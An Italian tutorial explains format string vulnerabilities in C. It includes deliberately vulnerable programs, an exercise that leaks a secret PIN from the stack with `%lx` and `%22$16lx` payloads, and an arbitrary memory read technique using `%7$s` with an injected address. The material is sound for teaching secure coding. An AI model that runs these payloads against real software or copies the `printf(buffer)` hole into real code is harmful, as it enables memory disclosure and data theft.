# format strings

Una format string è una stringa che contiene delle direttive di formato. Ad esempio in C le direttiva sono `%d`, `%s`, che vengono molto utilizzate in funzioni come `printf()` .

Ad esempio con l’istruzione `printf("Result: %d\n",r)` quello che succede è:

- **Parsing a runtime**: La funzione `printf` analizza la stringa `"Result: %d\n"` carattere per carattere a runtime per trovare i caratteri di formattazione (come `%d`).
- **Sostituzione di valori**: Quando trova un segnaposto (`%d` in questo caso), `printf` cerca i valori corrispondenti nella lista degli argomenti forniti (come `my_var`) e li sostituisce nel testo.
- **Output finale**: La stringa risultante viene quindi costruita e inviata a allo standard output.

### Interpretazione a runtime

Queste direttive vengono quindi **interpretate** a *runtime*, questo permette **l’accesso arbitrario allo stack** quando viene interpretata una string format (se quest’ultima viene controllata da un attaccante).

Nella seguente istruzione `printf(s);`  se `s`  contiene delle direttive di formato queste verranno interpretate:

```c
char *s = "valore: %d";
printf(s, 10);    // => valore: 10
```

### Argomenti alle funzioni

Le *format string* contengono un **numero arbitrario di direttive**, di conseguenza anche le funzioni che usano le *format string* accettano un numero arbitrario di argomenti.

Vediamo come può funzionare questa cosa:

1. la format string viene parsata
2. la i-esima direttiva viene mappata all’i-esimo argomento della funzione

In linguaggio assembly la *format string* viene salvata registro `rdi`, mentre gli argomenti successivi saranno salvati in `rsi, rdx, rcx, r8, r9` e se ce ne sono altri verranno pushati nello stack.

Ad esempio con l’istruzione `printf("%s%s%s%s%s%s","H","e","l","l","o"," World\n");` subito dopo l’invocazione alla funzione `printf` la memoria sarà in questo stato:

![https://i.ibb.co/VCvPwGm/image.png](https://i.ibb.co/VCvPwGm/image.png)

### Sbagliare il numero di argomenti

Siccome la *format string* viene interpretata a runtime, se si sbaglia il numero di argomenti (mettendone troppi o troppo pochi) non si avranno errori, ma solo un *warning* (se la format string è una variabile allora non c’è nemmeno il *warning)*.

Nel caso di un numero eccessivo di argomenti, quelli in più vengono ignorati. mentre con un numero di argomenti minore di quello richiesto, la funzione tenterà di dereferenziare il registro (il la zona nello stack) corrispondenti agli argomenti mancanti e se è un indirizzo dereferenziato è valido stampa quello che trova altrimenti va in *segmentation fault.*

## Vulnerabilità

Se un attaccante ha il controllo di una format string, ad esempio `s1` può riuscire a dumpare il contenuto dello stack e di alcuni registri usando delle direttive.

- `printf(s1)` VULNERABLE (warning a tempo di compilazione)
- `printf("%s",s1)` OK
- `printf(s1,s2)` VULNERABLE (nessun warning a tempo di compilazione)

### Esempio di codice vulnerabile

```c
#include <stdio.h>
int main() {
	 char buffer[128];
	 printf("What is your name? ");
	 fflush(stdout);
	 
	 // reads at most 128 bytes, including NULL!
	 fgets(buffer, sizeof(buffer), stdin);
	 
	 // format string vulnerability: the user controls buffer!
	 // should be printf("Hello %s",buffer) so that the format string
	 // is not controlled by the user.
	 printf("Hello ");
	 printf(buffer);
}
```

Se diamo come input al programma 8 volte la direttiva `“.%16lx”` (che indica numeri in formato esadecimale lunghi 16 caratteri aggiungendo zeri a sinistra se necessario) otteniamo questo:

![https://i.ibb.co/XFggvHV/image.png](https://i.ibb.co/XFggvHV/image.png)

Quando arriviamo a stampare i valori dello stack stiamo stampando il contenuto del `buffer`:

Se facciamo partire il buffer con 8 byte di ‘A’, dopo aver stampato i registri contenenti valori casuali, arriviamo a stampare il contenuto buffer (che ovviamente è salvato nello stack) come si nota dai caratteri `0x41 = A`, poi stampa anche il resto della stringa raggruppata per 8 byte.

![https://i.ibb.co/ZzDjLq9/image.png](https://i.ibb.co/ZzDjLq9/image.png)

## Esercizio

Possiamo ottenere il valore del pin dumpandolo dallo stack nel seguente codice?

```c
#include <stdio.h>
int main() {
	 char buffer[128];
	 char PIN[128] = "1337"; // secret PIN
	 
	 printf("What is your name? ");
	 fflush(stdout);
	 
	 // reads at most 128 bytes, including NULL!
	 fgets(buffer,sizeof(buffer),stdin);
	 
	 printf("Hello ");
	 // format string vulnerability: the attacker controls buffer
	 printf(buffer);
}
```

Supponiamo che il PIN venga allocato immediatamente dopo il buffer.

se riuscissimo a inserire abbastanza “`%016lx`” nel buffer in modo da leggere il contenuto dello stack fino al raggiungimento del PIN ce l’avremo fatta:

- il buffer è grande 128 byte, in tale buffer devo metterci le “`%016lx`”
- Il contenuto del buffer è nel sesto parametro, cioè quando si inizia a leggere lo stack
- raggiungere il PIN abbiamo bisogno consumare i primi 5 registri per poi leggere 8 byte 16 volte (per consumare il buffer) e infine leggere altri 8 byte per il PIN:
    
    6 + 16 = 22. Abbiamo quindi bisogno di 22 “`%016lx`” per raggiungere la prima word del PIN
    
- dato che la stringa “`%016lx`” è lunga 6 byte, la stringa totale sarà lunga 22*6 = 132 byte che è maggiore dei 128 byte che il nostro buffer ci permette di inserire

Quindi non riusciamo a raggiungere la stringa.

### Soluzione 1

Al posto di usare “`%016lx`” usiamo “`%lx`”, dato che la nuova stringa è lunga 3 byte la stringa totale sarà lunga 22*3 = 66 byte che ci sta dentro il buffer.

Eseguendo l’attacco otteniamo:

```c
python3 -c 'print(".%lx"*22)' | ./vulnerable
What is your name? Hello .6c6c6548.0.206f6c6c.0.7fffe46682b0.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.a.0.0.0.0.37333331
```

Gli ultimi byte (`37333331`) sono la password: la possiamo convertire da esadecimale a testo ASCII (`7331`) e poi siccome la rappresentazione è in *little endian* dobbiamo invertire l’ordine dei caratteri (`1337`)

### Soluzione 2

Nelle format string si può specificare il parametro da utilizzare con la seguente sintassi

`%6$016lx`, dove con `6$` indichiamo **l’indice dell’argomento** da utilizzare (che parte da `0`), in questo caso vogliamo che questa direttiva utilizzi il settimo argomento (`6$`)  passato alla `printf`, cioè il primo parametro che sta nello stack.

```c
printf("%6$d", 1, 2, 3, 4, 5, 6);  //=> 6
```

Se usiamo nella direttiva l’argomento con indice 22 otteniamo il PIN

```bash
python3 -c 'print("%22$16lx")' | ./vulnerable
What is your name? Hello 37333331
```

## Accesso a locazioni arbitrarie

Quando il buffer è salvato nello stack è possibile dumpare ogni locazione in memoria, l’idea è la seguente:

1. **Identificare la posizione del buffer nello stack**
2. **Iniettare l'indirizzo target nel buffer** in modo che corrisponda a un argomento specifico di `printf`, ad esempio l'argomento `a`.
3. **Estrarre il contenuto della memoria** utilizzando la direttiva **`%a$s`** per dereferenziare l'indirizzo target e stamparne il contenuto come stringa.

### Step 1

Identificare la posizione del buffer sullo stack:

Si inizia la stringa di input con `%a$16lx.AAAAAAAA` e si prova con diversi valori di `a` finché non si trova l'output `4141414141414141`.

- Questo indica che l'argomento `a` corrisponde alla posizione del buffer sullo stack.
- Ad esempio, se con `a=7`, vediamo per la prima volta l’output `4141414141414141` significa che il buffer inizia all’argomento che passiamo alla funzione con indice 6 (il quale conterrà `%a$16lx.`) e nella successiva cella dello stack, ad indice 7 invece abbiamo i secondi 8 byte del buffer contenenti `AAAAAAAA`.

Notare che `%a$16lx.` occupa esattamente 8 byte, quindi prende una intera cella dello stack.

### Step 2

Iniettare l'Indirizzo target:

Quello che possiamo fare è rimpiazzare le `AAAAAAAA` con un indirizzo target (in formato little endian)

Ad esempio, se l'indirizzo target è `0x6b90f0`, la stringa di input sarà `%7$16lx.\xf0\x90\x6b\x00\x00\x00\x00\x00`

### Step 3

Estrarre il contenuto della memoria:

Rimpiazzando `%7$16lx.` con `%7$s....`  possiamo stampare il contenuto all’indirizzo di memoria iniettato come stringa. 

Nota: i `....` servono per mantenere la lunghezza di 8 byte

Quindi con la seguente stringa in input otteniamo il contenuto di un indirizzo di memoria arbitrario

`%7$s....\xf0\x90\x6b\x00\x00\x00\x00\x00`

## Prevenzione agli attacchi

i compilatori moderni lanciano degli warning quando `printf` viene invocato senza argomenti di formato, nonostante ciò ci sono casi in cui non vengono lanciati warning ad esempio facendo `printf(f, s)`, se l’attaccante controllasse `f` riuscirebbe a fare l’attacco.

È quindi importante che la *format string* sia sempre una costante definita dal programmatore e non dovrebbe essere influenzata dall'input dell'utente.
